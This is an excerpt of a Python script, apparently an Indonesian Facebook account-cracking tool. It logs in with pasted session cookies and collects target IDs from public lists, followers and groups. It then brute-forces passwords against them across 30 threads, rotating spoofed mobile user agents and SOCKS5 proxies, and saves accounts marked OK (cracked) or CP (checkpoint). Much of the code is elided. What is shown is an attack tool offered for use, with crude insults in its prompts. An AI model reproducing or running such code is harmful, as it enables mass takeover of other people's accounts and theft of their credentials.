...
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	print(f'''\t{asu} __________________                                              
_  _ ____ _  _ ___  _  _ ____ ____ ____ ____ 
|__| |__| |\/| |__] |  | |__/ | __ |___ |__/ 
|  | |  | |  | |__] |__| |  \ |__] |___ |  \ 
			
      {m}•{k}•{h}• {b}Just {k}Have {h}Fun {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t✏ RecordBY : [gred]E-PunK[green] ⚔'))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}•{x}] Masukkan Cookies pelan pelan :{asu} ')
		...
		print(f'  {x}[{h}•{x}]{h} LOGIN SUKSES➡➡➡Jalankan Ulang Perintah{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....AKUN TUMBAL MATI!!%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
...
def menu(my_name,my_id):
	...
	cetak(nel('\tSelamat Datang [green]%s[white] ☺'%(my_name)))
	print(f'>> ʸᵒᵘʳ ID  : '+str(my_id))
	print(f'>> ʸᵒᵘʳ IP  : {ip}')
	print('')
	print('° 1. 𝙲𝚁𝙰𝙲𝙺 𝙿𝚄𝙱𝙻𝙸𝙺 ')
	print('° 2. 𝚁𝙴𝚂𝚄𝙻𝚃 ')
	print('° 0. 𝙺𝙴𝙻𝚄𝙰𝚁 ')
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('>> 𝙼𝙰𝚂𝚄𝙺𝙰𝙽 𝙹𝚄𝙼𝙻𝙰𝙷 𝚃𝙰𝚁𝙶𝙴𝚃 : '))
	except ValueError:
		print('>>𝘔𝘢𝘴𝘶𝘬𝘢𝘯 𝘈𝘯𝘨𝘬𝘢 ')
		exit()
	if jum<1 or jum>1000:
		print('>> 𝘎𝘈𝘎𝘈𝘓 𝘋𝘜𝘔𝘗 𝘐𝘋𝘡 ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('>> 𝙼𝙰𝚂𝚄𝙺𝙰𝙽 𝙸𝙳 𝚈𝙰𝙽𝙶 𝙺𝙴 '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			...
			print('>> 𝘫𝘢𝘳𝘪𝘯𝘨𝘢𝘯 𝘣𝘦𝘳𝘮𝘢𝘴𝘢𝘭𝘢𝘩 ')
			exit()
	try:
		print('')
		print(f'>> 𝚃𝙾𝚃𝙰𝙻 𝙸𝙳 𝚃𝙴𝚁𝙺𝚄𝙼𝙿𝚄𝙻 {m}⚔{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> 𝘚𝘪𝘯𝘺𝘢𝘭 𝘦𝘳𝘳𝘰𝘳 𝘕𝘰𝘵 𝘍𝘰𝘶𝘯𝘥 ')
		back()
	except (KeyError,IOError):
		print(f'>>{k} 𝘵𝘦𝘮𝘢𝘯 𝘵𝘪𝘥𝘢𝘬 𝘱𝘶𝘣𝘭𝘪𝘤 {x}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
...
def grup():
	...
	ua = 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v9096298158166404654 t7898349382904460768'
	...
	try:
		...
		print('>> JARINGAN BERMASALAH ULANGI!! ')
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
...
def crack_file():
	...
	if len(vin)==0:
		...
		try:geh = lol[geeh]
			...
			time.sleep(3)
			back()
		try:lin = open('/sdcard/GBLK-DUMP/'+geh,'r').read().splitlines()
		except:
...
def setting():
	...
	print('>> 2. 𝙰𝙺𝚄𝙽 𝙽𝙴𝚆 ')
	print('>> 3. 𝙰𝙺𝚄𝙽 𝚁𝙰𝙽𝙳𝙾𝙼 (𝚛𝚎𝚌𝚘𝚖𝚎𝚗𝚍𝚎𝚎𝚍) ')
	hu = input('>> Pilih : ')
	if hu in ['1','01']:
		...
		print('>> Masukan ulang pilihan anda ')
		exit()
	print('⚔  1. 𝙼𝙾𝙱𝙸𝙻𝙴 (𝚁𝚎𝚌𝚘𝚖𝚎𝚗𝚍𝚎𝚎𝚍) ')
	print('⚔  2. 𝚃𝙾𝚄𝙲𝙷 ')
	print('⚔  3. 𝙼𝚃𝙾𝚄𝙲𝙷  ')
	print('')
	hc = input('>> Select : ')
	if hc in ['1','01']:
		...
		method.append('mobile')
	print('')
	_jembot_ = input('>> 𝚃𝚊𝚖𝚋𝚊𝚑𝚔𝚊𝚗 𝙰𝚙𝚕𝚒𝚔𝚊𝚜𝚒 𝚈/𝚃 ')
	if _jembot_ in ['']:
		print('>> Pilih Yang Bener Kontol ')
		back()
		...
		taplikasi.append('no')
	pwplus=input('>> 𝚃𝚊𝚖𝚋𝚊𝚑𝚔𝚊𝚗 𝚙𝚠 𝙼𝚊𝚗𝚞𝚊𝚕 𝚈/𝚃 ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] 𝕄𝕒𝕤𝕦𝕜𝕒𝕟 𝕂𝕒𝕥𝕒 𝕊𝕒𝕟𝕕𝕚 𝕋𝕒𝕞𝕓𝕒𝕙𝕒𝕟 𝕄𝕚𝕟𝕚𝕞𝕒𝕝 𝟞 𝕂𝕒𝕣𝕒𝕜𝕥𝕖𝕣 r\n[[cyan]•[white]] ℂ𝕠𝕟𝕥𝕠𝕙 :[green] 𝕂𝕠𝕟𝕥𝕠𝕝,𝔹𝕒𝕡𝕒𝕜𝕒𝕦,ℙ𝕖𝕔𝕒𝕙[white] '))
		pwku=input('>> 𝙼𝚊𝚜𝚞𝚔𝚊𝚗 𝙺𝚊𝚝𝚊 𝚂𝚊𝚗𝚍𝚒 𝚃𝚊𝚖𝚋𝚊𝚑𝚊𝚗 : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> >>>>> >>>>> >>>>> {m}•{k}•{h}•{x} C̶R̶A̶C̶K̶I̶N̶G̶ {m}•{k}•{h}•{x} <<<<< <<<<< <<<<< <<<<< ')
	print('')
	print(f'>> 𝚁𝙴𝚂𝚄𝙻𝚃 {h}OK{x} 𝚜𝚊𝚟𝚎 𝚒𝚗: {h}OK/%s {x}'%(okc))
	print(f'>> 𝚁𝙴𝚂𝚄𝙻𝚃 {k}CP{x} 𝚜𝚊𝚟𝚎 𝚒𝚗 : {k}CP/%s {x}'%(cpc))
	print(f'>> 𝙾𝙽/𝙾𝙵𝙵 𝙰𝙸𝚁𝙿𝙻𝙰𝙽𝙴 𝙼𝙾𝙳𝙴 𝙴𝚅𝙴𝚁𝚈 {m}1k{x} 𝙸𝙳\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[blue] 𝘤𝘳𝘢𝘤𝘬 𝘴𝘦𝘭𝘦𝘴𝘢𝘪 𝘯𝘨𝘢𝘣, 𝘫𝘢𝘯𝘨𝘢𝘯 𝘭𝘶𝘱𝘢 𝘤𝘳𝘢𝘤𝘬 𝘭𝘢𝘨𝘪 [cyan] ✓[white] '))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('>> 𝘉𝘢𝘤𝘬 𝘛𝘰 𝘔𝘦𝘯𝘶( Y/t ) ? ')
	woi = input('>> Select : ')
	exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	...
	sys.stdout.flush()
	ua =random.choice(["Mozilla/5.0 (Linux; Android 5.1; OPPO A37m) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; CPH1803) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; CPH1933) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; CPH2239) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; PFUM10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; CPH1969) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; CPH2371) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; CPH2091) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; PEDM00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; 21091116AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2007J22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; 22120RN86G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; REDMI 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36"])
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					print(f'\r{b}•|OK|{M}{H}{idf}|{pw}\n└── y{kuki}\n{x}{B}└── {x}{B}User Agent{x}{b}:{x}{B}{ua}{H}')
...
def crackmbasic(idf,pwv):
	...
	nip=random.choice(prox)
	proxs= {'http': 'socks5://'+nip}
	ua = 'Mozilla/5.0 (Linux; Android 5.1; vivo Y21 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36 VivoBrowser/5.1.23'
	ua2 = 'Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Build/QKQ1.200114.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/377.0.0.22.107;]'
	ses = requests.Session()
	sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
...
def cek_opsi():
	...
	for kes in akun:
		try:
			...
			ua = 'Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36'
			ses = requests.Session()
